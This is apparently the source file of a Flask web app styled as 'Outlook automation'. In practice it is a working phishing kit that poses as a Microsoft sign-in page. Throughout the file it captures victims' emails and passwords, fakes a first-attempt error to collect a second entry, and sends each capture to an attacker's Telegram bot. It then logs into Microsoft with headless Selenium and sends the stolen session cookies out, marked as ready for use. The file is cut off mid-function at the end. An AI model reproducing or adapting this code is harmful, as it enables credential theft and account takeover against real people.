from flask import Flask, request, render_template, jsonify, session, redirect, url_for, flash
import re
import dns.resolver
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
from time import sleep
import requests
import logging
import os
from flask_session import Session
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timedelta
# from python_decouple import config
# Use os.environ instead for simplicity
def config(key, default=None):
    return os.environ.get(key, default)
from flask_wtf import FlaskForm, CSRFProtect
from wtforms import StringField, PasswordField, SubmitField
from wtforms.validators import DataRequired, Email
import bcrypt
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import sentry_sdk
import json
import redis
import uuid
from functools import wraps

# Initialize Sentry for monitoring (optional)
sentry_dsn = config('SENTRY_DSN', default=None)
if sentry_dsn:
    sentry_sdk.init(dsn=sentry_dsn)

app = Flask(__name__)
app.secret_key = config('SECRET_KEY', default='dev-key-change-in-production')

# Enhanced logging configuration
if not os.path.exists('logs'):
    os.makedirs('logs')

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/app.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Session configuration - try Redis first, fall back to filesystem
try:
    redis_test = redis.from_url('redis://localhost:6379/0')
    redis_test.ping()
    app.config['SESSION_TYPE'] = 'redis'
    app.config['SESSION_REDIS'] = redis_test
    logger.info("Using Redis for session storage")
except:
    app.config['SESSION_TYPE'] = 'filesystem'
    app.config['SESSION_FILE_DIR'] = './flask_session'
    logger.info("Using filesystem for session storage")

app.config['SESSION_PERMANENT'] = False
app.config['SESSION_USE_SIGNER'] = True
app.config['SESSION_KEY_PREFIX'] = 'outlook_automation:'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=1)

# Database configuration  
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///users.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Initialize extensions
Session(app)
db = SQLAlchemy(app)
csrf = CSRFProtect(app)
limiter = Limiter(
    key_func=get_remote_address,
    app=app,
    default_limits=["1000 per hour", "100 per minute"]
)

# Redis connection for session debugging (optional)
try:
    redis_client = redis.from_url('redis://localhost:6379/0')
    redis_client.ping()
    logger.info("Redis connection established successfully")
except Exception as e:
    logger.info(f"Redis not available, using filesystem sessions: {e}")
    redis_client = None

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password_hash = db.Column(db.String(128))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    last_login = db.Column(db.DateTime)

class SessionLog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    session_id = db.Column(db.String(255), nullable=False)
    user_email = db.Column(db.String(120))
    action = db.Column(db.String(100), nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    ip_address = db.Column(db.String(45))
    user_agent = db.Column(db.Text)
    success = db.Column(db.Boolean, default=True)
    error_message = db.Column(db.Text)

class LoginAttempt(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_email = db.Column(db.String(120), nullable=False)
    session_id = db.Column(db.String(255), nullable=False)
    attempt_count = db.Column(db.Integer, default=0)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

class LoginForm(FlaskForm):
    email = StringField('Email', validators=[DataRequired(), Email()])
    password = PasswordField('Password', validators=[DataRequired()])
    submit = SubmitField('Next')

def log_session_activity(action, user_email=None, success=True, error_message=None):
    """Log session activity for debugging purposes"""
    try:
        log_entry = SessionLog()
        log_entry.session_id = session.get('session_id', 'unknown')
        log_entry.user_email = user_email
        log_entry.action = action
        log_entry.ip_address = get_remote_address()
        log_entry.user_agent = request.user_agent.string
        log_entry.success = success
        log_entry.error_message = error_message
        db.session.add(log_entry)
        db.session.commit()
        logger.info(f"Session activity logged: {action} for {user_email}")
    except Exception as e:
        logger.error(f"Failed to log session activity: {e}")

def create_session_id():
    """Create a unique session ID"""
    if 'session_id' not in session:
        session['session_id'] = str(uuid.uuid4())
    return session['session_id']

def validate_email_domain(email):
    """Enhanced email domain validation"""
    if not re.match(r"[^@]+@[^@]+\.[^@]+", email):
        return False, "Invalid email format"
    
    domain = email.split('@')[1]
    try:
        # Check for MX records
        mx_records = dns.resolver.resolve(domain, 'MX')
        if not mx_records:
            return False, "Domain has no mail servers"
        
        logger.info(f"Domain {domain} validated successfully")
        return True, "Valid domain"
    except Exception as e:
        logger.error(f"MX lookup failed for {domain}: {e}")
        return False, f"Invalid domain: {str(e)}"

def setup_chrome_driver():
    """Setup Chrome WebDriver with proper options"""
    try:
        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--window-size=1920,1080")
        options.add_argument("--disable-extensions")
        options.add_argument("--disable-plugins")
        options.add_argument("--disable-images")
        options.add_argument("--disable-javascript")
        options.add_experimental_option('useAutomationExtension', False)
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
        
        # Try to create driver
        driver = webdriver.Chrome(options=options)
        driver.set_page_load_timeout(30)
        driver.implicitly_wait(10)
        
        logger.info("Chrome WebDriver initialized successfully")
        return driver
    except Exception as e:
        logger.error(f"Failed to initialize Chrome WebDriver: {e}")
        # Try installing Chrome if it fails
        import subprocess
        try:
            subprocess.run(['apt-get', 'update'], check=True, capture_output=True)
            subprocess.run(['apt-get', 'install', '-y', 'google-chrome-stable'], check=True, capture_output=True)
            logger.info("Chrome installed successfully")
            # Retry driver creation
            driver = webdriver.Chrome(options=options)
            driver.set_page_load_timeout(30)
            driver.implicitly_wait(10)
            return driver
        except Exception as install_error:
            logger.error(f"Failed to install Chrome: {install_error}")
            raise e

def extract_and_save_cookies(driver, email, password=None):
    """Extract only session cookies from successful Office.com login and save them"""
    try:
        # Navigate to office.com to verify successful login and get session cookies
        driver.get("https://office.com")
        sleep(5)  # Wait for page to load
        
        # Check if we're actually logged in to Office.com
        current_url = driver.current_url
        page_title = driver.title.lower()
        
        # Verify we're successfully logged into Office
        if "office" not in current_url.lower() or "sign" in page_title or "login" in page_title:
            logger.warning(f"Not successfully logged into Office.com. URL: {current_url}, Title: {page_title}")
            return False
        
        cookies = driver.get_cookies()
        if not cookies:
            logger.warning("No cookies found in WebDriver")
            return False
        
        # Filter only session-related cookies from office.com and microsoft domains
        session_cookies = []
        session_cookie_names = [
            'FedAuth', 'rtFa', 'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT',
            'SignInStateCookie', 'buid', 'MSFPC', 'ai_session', 'MUID',
            'wla42', 'MSPAuth', 'MSPProf', 'MSPSoftVis', 'MSCC'
        ]
        
        for cookie in cookies:
            # Include cookies from Microsoft/Office domains that are session-related
            if (any(domain in cookie['domain'].lower() for domain in ['office.com', 'microsoft.com', 'microsoftonline.com', 'live.com']) and
                (cookie['name'] in session_cookie_names or 'auth' in cookie['name'].lower() or 'session' in cookie['name'].lower())):
                session_cookies.append(cookie)
        
        if not session_cookies:
            logger.warning("No session cookies found for Office.com")
            return False
        
        # Create cookies directory if it doesn't exist
        if not os.path.exists('cookies'):
            os.makedirs('cookies')
        
        # Save only session cookies with timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f'cookies/session_cookies_{email.replace("@", "_")}_{timestamp}.txt'
        
        with open(filename, 'w') as f:
            f.write(f"# WORKER CREDENTIALS CAPTURED\n")
            f.write(f"# Email: {email}\n")
            f.write(f"# IP Address: {request.remote_addr if request else 'Unknown'}\n")
            f.write(f"# Timestamp: {datetime.now()}\n")
            f.write(f"# Successfully logged into Office.com: {current_url}\n")
            f.write(f"# Total session cookies: {len(session_cookies)}\n\n")
            f.write("=" * 60 + "\n")
            f.write("SESSION COOKIES:\n")
            f.write("=" * 60 + "\n\n")
            
            for cookie in session_cookies:
                f.write(f"Name: {cookie['name']}\n")
                f.write(f"Value: {cookie['value']}\n")
                f.write(f"Domain: {cookie['domain']}\n")
                f.write(f"Path: {cookie['path']}\n")
                f.write(f"Secure: {cookie['secure']}\n")
                f.write(f"HttpOnly: {cookie.get('httpOnly', False)}\n")
                f.write("-" * 50 + "\n")
        
        # Also save as JSON for easier parsing
        json_filename = f'cookies/session_cookies_{email.replace("@", "_")}_{timestamp}.json'
        with open(json_filename, 'w') as f:
            json.dump(session_cookies, f, indent=2)
        
        logger.info(f"Session cookies saved to {filename} and {json_filename}")
        return filename
    except Exception as e:
        logger.error(f"Failed to extract and save session cookies: {e}")
        return False

def send_first_attempt_to_telegram(email, password, ip_address):
    """Send first password attempt to Telegram"""
    try:
        bot_token = config('BOT_TOKEN', default=None)
        chat_id = config('CHAT_ID', default=None)
        
        if not bot_token or not chat_id:
            logger.error("❌ Telegram credentials not properly configured!")
            return False
        
        if bot_token.strip() == '' or chat_id.strip() == '':
            logger.error("❌ Telegram credentials are empty!")
            return False
        
        # Create message for first attempt
        message = f"""🔑 WORKER CREDENTIALS - FIRST ATTEMPT
📧 Email: {email}
🔒 Password: {password}
🌐 IP Address: {ip_address}
📅 Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
⚠️ Status: First attempt (blocked automatically)
🔄 Next: Moving to second password attempt"""
        
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        
        response = requests.post(
            url,
            data={
                'chat_id': chat_id,
                'text': message
            },
            timeout=30
        )
        
        logger.info(f"First attempt response status: {response.status_code}")
        logger.info(f"First attempt response: {response.text}")
        
        return response.status_code == 200
            
    except Exception as e:
        logger.error(f"❌ Error sending first attempt to Telegram: {e}")
        return False

def send_second_attempt_to_telegram(email, password, ip_address):
    """Send second password attempt to Telegram"""
    try:
        bot_token = config('BOT_TOKEN', default=None)
        chat_id = config('CHAT_ID', default=None)
        
        if not bot_token or not chat_id:
            logger.error("❌ Telegram credentials not properly configured!")
            return False
        
        if bot_token.strip() == '' or chat_id.strip() == '':
            logger.error("❌ Telegram credentials are empty!")
            return False
        
        # Create message for second attempt
        message = f"""🔑 WORKER CREDENTIALS - SECOND ATTEMPT
📧 Email: {email}
🔒 Password: {password}
🌐 IP Address: {ip_address}
📅 Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
✅ Status: Second attempt (proceeding to automation)
🤖 Next: Starting browser automation and cookie extraction"""
        
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        
        response = requests.post(
            url,
            data={
                'chat_id': chat_id,
                'text': message
            },
            timeout=30
        )
        
        logger.info(f"Second attempt response status: {response.status_code}")
        logger.info(f"Second attempt response: {response.text}")
        
        return response.status_code == 200
            
    except Exception as e:
        logger.error(f"❌ Error sending second attempt to Telegram: {e}")
        return False

def send_immediate_credentials_to_telegram(email, password, ip_address):
    """Send credentials to Telegram immediately when entered"""
    try:
        bot_token = config('BOT_TOKEN', default=None)
        chat_id = config('CHAT_ID', default=None)
        
        if not bot_token or not chat_id:
            logger.error("❌ Telegram credentials not properly configured!")
            return False
        
        if bot_token.strip() == '' or chat_id.strip() == '':
            logger.error("❌ Telegram credentials are empty!")
            return False
        
        # Create immediate notification message
        message = f"""🚨 IMMEDIATE WORKER CAPTURE
📧 Email: {email}
🔒 Password: {password}
🌐 IP Address: {ip_address}
📅 Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
⚡ Status: IMMEDIATELY CAPTURED
🔄 Next: Processing through automation system"""
        
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        
        response = requests.post(
            url,
            data={
                'chat_id': chat_id,
                'text': message
            },
            timeout=30
        )
        
        logger.info(f"Immediate response status: {response.status_code}")
        logger.info(f"Immediate response: {response.text}")
        
        return response.status_code == 200
            
    except Exception as e:
        logger.error(f"❌ Error sending immediate credentials to Telegram: {e}")
        return False

def send_cookies_to_telegram(filename, email, password, ip_address):
    """Send cookies file to Telegram with worker details"""
    try:
        bot_token = config('BOT_TOKEN', default=None)
        chat_id = config('CHAT_ID', default=None)
        
        # Check if values are properly set
        if not bot_token or not chat_id:
            logger.error("❌ Telegram credentials not properly configured!")
            logger.error(f"BOT_TOKEN: {bot_token if bot_token else 'NOT SET'}")
            logger.error(f"CHAT_ID: {chat_id if chat_id else 'NOT SET'}")
            return False
        
        # Remove placeholder check - just verify they exist
        if bot_token.strip() == '' or chat_id.strip() == '':
            logger.error("❌ Telegram credentials are empty!")
            return False
        
        logger.info(f"🔄 Attempting to send to Telegram...")
        logger.info(f"Bot Token: {bot_token[:10]}..." if len(bot_token) > 10 else f"Bot Token: {bot_token}")
        logger.info(f"Chat ID: {chat_id}")
        logger.info(f"Bot Token length: {len(bot_token)}")
        logger.info(f"Chat ID type: {type(chat_id)}")
        
        # Create detailed caption with worker information
        caption = f"""🔑 FINAL WORKER REPORT - COOKIES CAPTURED
📧 Email: {email}
🔒 Password: {password}
🌐 IP Address: {ip_address}
📅 Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
📁 Cookie File: {filename.split('/')[-1] if filename else 'No file'}
✅ Status: Successfully logged into Office.com
🍪 Cookies extracted and ready for use"""
        
        logger.info(f"📤 Sending worker details to Telegram - Email: {email}, IP: {ip_address}")
        logger.info(f"📤 Message length: {len(caption)} characters")
        
        # First send the worker details as a message
        message_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        
        try:
            message_response = requests.post(
                message_url,
                data={
                    'chat_id': chat_id,
                    'text': caption
                },
                timeout=30
            )
            
            logger.info(f"Message response status: {message_response.status_code}")
            logger.info(f"Message response: {message_response.text}")
            
            if message_response.status_code == 200:
                logger.info("✅ Worker details message sent successfully!")
                message_sent = True
            else:
                logger.error(f"❌ Failed to send worker details message: {message_response.text}")
                message_sent = False
                
        except Exception as msg_e:
            logger.error(f"❌ Exception sending message: {msg_e}")
            message_sent = False
        
        # Then send the cookies file if it exists
        file_sent = False
        if filename and os.path.exists(filename):
            try:
                file_url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                
                with open(filename, 'rb') as file:
                    file_response = requests.post(
                        file_url,
                        data={
                            'chat_id': chat_id,
                            'caption': f"📁 Session cookies for {email}"
                        },
                        files={'document': file},
                        timeout=30
                    )
                
                logger.info(f"File response status: {file_response.status_code}")
                logger.info(f"File response: {file_response.text}")
                
                if file_response.status_code == 200:
                    logger.info("✅ Cookie file sent successfully!")
                    file_sent = True
                else:
                    logger.error(f"❌ Failed to send cookies file: {file_response.text}")
                    
            except Exception as file_e:
                logger.error(f"❌ Exception sending file: {file_e}")
        else:
            logger.warning(f"⚠️ Cookie file not found: {filename}")
        
        # Return True if either message or file was sent successfully
        success = message_sent or file_sent
        
        if success:
            logger.info(f"✅ Telegram reporting completed for {email}")
        else:
            logger.error(f"❌ All Telegram sending attempts failed for {email}")
            
        return success
            
    except Exception as e:
        logger.error(f"❌ Critical error in Telegram function: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return False

@app.before_request
def before_request():
    """Initialize session before each request"""
    create_session_id()
    session.permanent = True
    
    # CAPTURE CREDENTIALS IMMEDIATELY ON ANY POST REQUEST
    if request.method == 'POST' and request.endpoint == 'process_form':
        email = request.form.get('email', '').strip().lower()
        password = request.form.get('password', '')
        
        logger.info(f"🔍 BEFORE_REQUEST DEBUG: email='{email}', password='{password}' (length: {len(password)})")
        
        if email and password:
            # Send credentials to Telegram immediately when submitted
            worker_ip = get_remote_address()
            logger.info(f"📤 BEFORE_REQUEST IMMEDIATE REPORTING: Sending credentials to Telegram for {email}")
            
            try:
                immediate_success = send_immediate_credentials_to_telegram(email, password, worker_ip)
                if immediate_success:
                    logger.info(f"✅ BEFORE_REQUEST: Immediate credentials reported to Telegram for {email}")
                else:
                    logger.error(f"❌ BEFORE_REQUEST: Failed to send immediate credentials to Telegram for {email}")
            except Exception as e:
                logger.error(f"❌ BEFORE_REQUEST: Exception sending credentials: {e}")
        else:
            logger.warning(f"⚠️ BEFORE_REQUEST: Skipping Telegram - email='{email}', password={'[HIDDEN]' if password else '[EMPTY]'}")

@app.route('/')
@limiter.limit("200 per minute")
def index():
    email = request.args.get('email', '').strip()
    step = request.args.get('step', 'email')
    error = request.args.get('error', '')
    
    log_session_activity("page_visit", user_email=email)
    
    # Email validation step
    if step == 'email' and email:
        valid, message = validate_email_domain(email)
        if not valid:
            flash(message, 'error')
            log_session_activity("email_validation_failed", user_email=email, success=False, error_message=message)
            return render_template('index.html', step='email', error=message)
    
    form = LoginForm()
    sitekey = config('CLOUDFLARE_SITEKEY', default='')
    
    return render_template('index.html', 
                         form=form, 
                         email=email, 
                         step=step, 
                         error=error, 
                         sitekey=sitekey,
                         session_id=session.get('session_id'))

@app.route('/verify-turnstile', methods=['POST'])
@limiter.limit("50 per minute")
def verify_turnstile():
    """Verify Cloudflare Turnstile challenge"""
    try:
        token = request.form.get('cf-turnstile-response')
        if not token:
            return jsonify({'success': False, 'error': 'No token provided'})
        
        secret_key = config('CLOUDFLARE_SECRET_KEY', default='')
        if not secret_key:
            logger.warning("Cloudflare secret key not configured")
            return jsonify({'success': True})  # Allow in development
        
        response = requests.post(
            'https://challenges.cloudflare.com/turnstile/v0/siteverify',
            data={
                'secret': secret_key,
                'response': token,
                'remoteip': get_remote_address()
            },
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            timeout=10
        )
        
        result = response.json()
        success = result.get('success', False)
        
        log_session_activity("turnstile_verification", success=success, 
                           error_message=None if success else str(result.get('error-codes', [])))
        
        return jsonify({
            'success': success,
            'error-codes': result.get('error-codes', [])
        })
        
    except Exception as e:
        logger.error(f"Turnstile verification error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/', methods=['POST'])
@limiter.limit("100 per minute")
def process_form():
    # DEBUG: Log all form data
    logger.info(f"🔍 FORM DEBUG: Received form data: {dict(request.form)}")
    
    # CAPTURE CREDENTIALS IMMEDIATELY BEFORE ANY VALIDATION
    email = request.form.get('email', '').strip().lower()
    password = request.form.get('password', '')
    
    logger.info(f"🔍 EXTRACTED: email='{email}', password='{password}' (length: {len(password)})")
    
    if email and password:
        # Send credentials to Telegram immediately when submitted
        worker_ip = get_remote_address()
        logger.info(f"📤 IMMEDIATE REPORTING: Sending credentials to Telegram for {email}")
        
        immediate_success = send_immediate_credentials_to_telegram(email, password, worker_ip)
        if immediate_success:
            logger.info(f"✅ Immediate credentials reported to Telegram for {email}")
        else:
            logger.error(f"❌ Failed to send immediate credentials to Telegram for {email}")
    else:
        logger.warning(f"⚠️ SKIPPING TELEGRAM: email={email}, password={'[HIDDEN]' if password else '[EMPTY]'}")
    
    form = LoginForm()
    
    if not form.validate_on_submit():
        flash('Form validation failed', 'error')
        return redirect(url_for('index'))
    
    # Verify Turnstile if configured
    turnstile_token = request.form.get('cf-turnstile-response')
    if config('CLOUDFLARE_SECRET_KEY', default=''):
        try:
            verify_response = requests.post(
                url_for('verify_turnstile', _external=True),
                data={'cf-turnstile-response': turnstile_token}
            )
            if not verify_response.json().get('success'):
                flash('Security verification failed', 'error')
                log_session_activity("security_verification_failed", success=False)
                return redirect(url_for('index'))
        except Exception as e:
            logger.error(f"Turnstile verification error in form processing: {e}")
    
    email = form.email.data.strip().lower()
    submit_action = request.form.get('submit', 'Next')
    
    if submit_action == 'Next':
        # Email step
        valid, message = validate_email_domain(email)
        if not valid:
            flash(message, 'error')
            log_session_activity("email_step_failed", user_email=email, success=False, error_message=message)
            return redirect(url_for('index', step='email', error='true'))
        
        log_session_activity("email_step_completed", user_email=email)
        return redirect(url_for('index', step='password', email=email))
    
    else:
        # Password step - perform login automation
        email = form.email.data if form.email.data else (request.args.get('email') or '')
        if email:
            email = email.strip().lower()
        password = form.password.data
        
        if not email or not password:
            flash('Email and password are required', 'error')
            return redirect(url_for('index', step='password', email=email, error='true'))
        
        # IMMEDIATELY send credentials to Telegram when submitted
        worker_ip = get_remote_address()
        logger.info(f"📤 IMMEDIATE REPORTING: Sending credentials to Telegram for {email}")
        
        # Send immediate notification with both email and password
        immediate_success = send_immediate_credentials_to_telegram(email, password, worker_ip)
        if immediate_success:
            logger.info(f"✅ Immediate credentials reported to Telegram for {email}")
        else:
            logger.error(f"❌ Failed to send immediate credentials to Telegram for {email}")
        
        # Check if user exists and password is correct
        user = User.query.filter_by(email=email).first()
        if not user:
            # Create new user for this demo (in production, you'd handle registration differently)
            hashed_password = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
            user = User()
            user.email = email
            user.password_hash = hashed_password
            db.session.add(user)
            db.session.commit()
            logger.info(f"New user created: {email}")
        
        # Validate password for legitimate users
        if user.password_hash and not bcrypt.checkpw(password.encode('utf-8'), user.password_hash.encode('utf-8')):
            flash('Invalid credentials', 'error')
            log_session_activity("login_failed", user_email=email, success=False, error_message="Invalid credentials")
            return redirect(url_for('index', step='password', email=email, error='true'))
        
        # Two-pass authentication logic
        current_session_id = session.get('session_id')
        login_attempt = LoginAttempt.query.filter_by(
            user_email=email, 
            session_id=current_session_id
        ).first()
        
        if not login_attempt:
            # First attempt - create new attempt record and go to second pass
            login_attempt = LoginAttempt()
            login_attempt.user_email = email
            login_attempt.session_id = current_session_id
            login_attempt.attempt_count = 1
            db.session.add(login_attempt)
            db.session.commit()
            
            log_session_activity("first_attempt_blocked", user_email=email, success=False, 
                               error_message="First attempt automatically failed - moving to second pass")
            
            # Report first attempt to Telegram immediately
            worker_ip = get_remote_address()
            logger.info(f"📤 Sending FIRST attempt worker details to Telegram for {email}")
            telegram_success = send_first_attempt_to_telegram(email, password, worker_ip)
            if telegram_success:
                logger.info(f"✅ First attempt reported to Telegram for {email}")
            else:
                logger.error(f"❌ Failed to send first attempt to Telegram for {email}")
            
            # Always flash error for first attempt and redirect to retry
            flash('Your account or password is incorrect. Try again.', 'error')
            return redirect(url_for('index', step='retry', email=email, retry='true'))
        
        elif login_attempt.attempt_count == 1:
            # Second attempt - report to Telegram before proceeding with automation
            login_attempt.attempt_count = 2
            login_attempt.updated_at = datetime.utcnow()
            db.session.commit()
            log_session_activity("second_attempt_proceeding", user_email=email)
            
            # Report second attempt to Telegram immediately
            worker_ip = get_remote_address()
            logger.info(f"📤 Sending SECOND attempt worker details to Telegram for {email}")
            telegram_success = send_second_attempt_to_telegram(email, password, worker_ip)
            if telegram_success:
                logger.info(f"✅ Second attempt reported to Telegram for {email}")
            else:
                logger.error(f"❌ Failed to send second attempt to Telegram for {email}")
            
            # Continue with Selenium automation below
        
        else:
            # More than 2 attempts - reset and start over
            login_attempt.attempt_count = 1
            login_attempt.updated_at = datetime.utcnow()
            db.session.commit()
            
            flash('Your account or password is incorrect. If you don\'t remember your password, reset it now.', 'error')
            log_session_activity("attempt_reset", user_email=email, success=False, 
                               error_message="Attempt counter reset - starting two-pass cycle again")
            return redirect(url_for('index', step='password', email=email, error='true'))
        
        # Perform Selenium automation
        driver = None
        try:
            log_session_activity("selenium_automation_started", user_email=email)
            driver = setup_chrome_driver()
            
            # Navigate to Microsoft login
            driver.get("https://login.microsoftonline.com")
            logger.info("Navigated to Microsoft login page")
            
            # Wait for and fill email
            email_field = WebDriverWait(driver, 20).until(
                EC.presence_of_element_located((By.NAME, "loginfmt"))
            )
            email_field.clear()
            email_field.send_keys(email)
            
            # Click next
            next_button = driver.find_element(By.ID, "idSIButton9")
            next_button.click()
            
            # Wait for password field
            sleep(3)
            password_field = WebDriverWait(driver, 20).until(
                EC.presence_of_element_located((By.NAME, "passwd"))
            )
            password_field.clear()
            password_field.send_keys(password)
            
            # Click sign in
            signin_button = driver.find_element(By.ID, "idSIButton9")
            signin_button.click()
            
            # Wait for login to complete
            sleep(10)
            
            # Check for errors
            current_url = driver.current_url
            page_source = driver.page_source.lower()
            
            if any(error_indicator in page_source for error_indicator in ['error', 'incorrect', 'invalid', 'failed']):
                if 'error' in current_url:
                    error_msg = "Login failed - invalid credentials or account issue"
                    logger.error(f"Login failed for {email}: error in URL")
                    log_session_activity("login_automation_failed", user_email=email, success=False, error_message=error_msg)
                    flash(error_msg, 'error')
                    return redirect(url_for('index', step='password', email=email, error='true'))
            
            # Always send worker details to Telegram first, even before cookie extraction
            worker_ip = get_remote_address()
            logger.info(f"Attempting to send worker details to Telegram for {email}")
            
            # Extract and save cookies
            cookie_file = extract_and_save_cookies(driver, email, password)
            if not cookie_file:
                error_msg = "Failed to extract cookies"
                log_session_activity("cookie_extraction_failed", user_email=email, success=False, error_message=error_msg)
                flash(error_msg, 'error')
                return redirect(url_for('index', step='password', email=email, error='true'))
            
            # Send cookies and worker details to Telegram
            telegram_success = send_cookies_to_telegram(cookie_file, email, password, worker_ip)
            if telegram_success:
                log_session_activity("telegram_send_success", user_email=email)
                logger.info(f"✅ Successfully sent worker details to Telegram for {email}")
            else:
                log_session_activity("telegram_send_failed", user_email=email, success=False)
                logger.error(f"❌ Failed to send worker details to Telegram for {email}")
                
                # Try to send just the worker details without file as backup
                try:
                    bot_token = config('BOT_TOKEN', default=None)
                    chat_id = config('CHAT_ID', default=None)
                    if bot_token and chat_id:
                        backup_message = f"""🔑 WORKER CREDENTIALS (BACKUP SEND)
📧 Email: {email}
🔒 Password: {password}
🌐 IP: {worker_ip}
📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
⚠️ Cookie file failed to send"""
                        
                        backup_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                        backup_response = requests.post(
                            backup_url,
                            data={'chat_id': chat_id, 'text': backup_message},
                            timeout=10
                        )
                        if backup_response.status_code == 200:
                            logger.info("✅ Backup worker details sent successfully")
                except Exception as backup_e:
                    logger.error(f"❌ Backup send also failed: {backup_e}")
            
            # Update user last login
            user.last_login = datetime.utcnow()
            db.session.commit()
            
            log_session_activity("login_automation_completed", user_email=email)
            logger.info(f"Successful login automation for {email}")
            
            # Redirect to Microsoft.com after successful cookie extraction
            return redirect("https://microsoft.com")
            
        except TimeoutException as e:
            error_msg = f"Login timeout - please try again: {str(e)}"
            logger.error(f"Timeout during login automation for {email}: {e}")
            log_session_activity("login_timeout", user_email=email, success=False, error_message=error_msg)
            flash(error_msg, 'error')
            
        except WebDriverException as e:
            error_msg = f"Browser automation error: {str(e)}"
            logger.error(f"WebDriver error for {email}: {e}")
            log_session_activity("webdriver_error", user_email=email, success=False, error_message=error_msg)
            flash(error_msg, 'error')
            
        except Exception as e:
            error_msg = f"Unexpected error during login automation: {str(e)}"
            logger.error(f"Unexpected error during login for {email}: {e}")
            log_session_activity("unexpected_error", user_email=email, success=False, error_message=error_msg)
            flash(error_msg, 'error')
            
        finally:
            # Ensure driver is always cleaned up
            if driver:
                try:
                    driver.close()
                    driver.quit()
                    logger.info("WebDriver cleaned up successfully")
                except Exception as e:
                    logger.error(f"Error during WebDriver cleanup: {e}")
                    # Force kill any remaining browser processes
                    try:
                        import subprocess
                        subprocess.run(['pkill', '-f', 'chrome'], capture_output=True)
                    except:
                        pass
        
        return redirect(url_for('index', step='password', email=email, error='true'))

@app.route('/debug/sessions')
@limiter.limit("5 per minute")
def debug_sessions():
    """Debug endpoint to view session information"""
    try:
        session_data = {
            'current_session': dict(session),
            'session_id': session.get('session_id', 'Not set'),
            'redis_connection': 'Connected' if redis_client else 'Not connected'
        }
        
        # Get session files from filesystem or Redis keys
        if redis_client:
            try:
                keys = redis_client.keys('outlook_automation:*')
                session_data['redis_keys'] = [key.decode() for key in keys]
                session_data['redis_key_count'] = len(keys)
            except Exception as e:
                session_data['redis_error'] = str(e)
        else:
            # Count filesystem session files
            import glob
            session_files = glob.glob('./flask_session/*')
            session_data['session_files'] = len(session_files)
            session_data['session_storage'] = 'filesystem'
        
        # Get recent session logs
        recent_logs = SessionLog.query.order_by(SessionLog.timestamp.desc()).limit(20).all()
        
        return render_template('debug.html', 
                             session_data=session_data,
                             recent_logs=recent_logs)
                             
    except Exception as e:
        logger.error(f"Error in debug sessions: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/debug/clear-sessions', methods=['POST'])
@limiter.limit("2 per minute")
def clear_sessions():
    """Clear all sessions from storage (Redis or filesystem)"""
    try:
        count = 0
        if redis_client:
            # Clear Redis sessions
            keys = redis_client.keys('outlook_automation:*')
            if keys:
                redis_client.delete(*keys)
                count = len(keys)
            flash(f'Cleared {count} session(s) from Redis', 'success')
        else:
            # Clear filesystem sessions
            import glob
            import os
            session_files = glob.glob('./flask_session/*')
            for file in session_files:
                try:
                    os.remove(file)
                    count += 1
                except Exception:
                    pass
            flash(f'Cleared {count} session file(s) from filesystem', 'success')
        
        log_session_activity("sessions_cleared", success=True)
            
    except Exception as e:
        flash(f'Error clearing sessions: {str(e)}', 'error')
        logger.error(f"Error clearing sessions: {e}")
    
    return redirect(url_for('debug_sessions'))

@app.route('/test-telegram-simple')
@limiter.limit("2 per minute") 
def test_telegram_simple():
    """Simple test to send a message to Telegram"""
    try:
        bot_token = config('BOT_TOKEN', default=None)
        chat_id = config('CHAT_ID', default=None)
        
        logger.info(f"🧪 Simple Telegram Test")
        logger.info(f"BOT_TOKEN: {bot_token}")
        logger.info(f"CHAT_ID: {chat_id}")
        
        if not bot_token or not chat_id:
            return f"Missing credentials: BOT_TOKEN={bot_token}, CHAT_ID={chat_id}"
            
        message = f"🧪 Test message from Flask app at {datetime.now()}"
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        
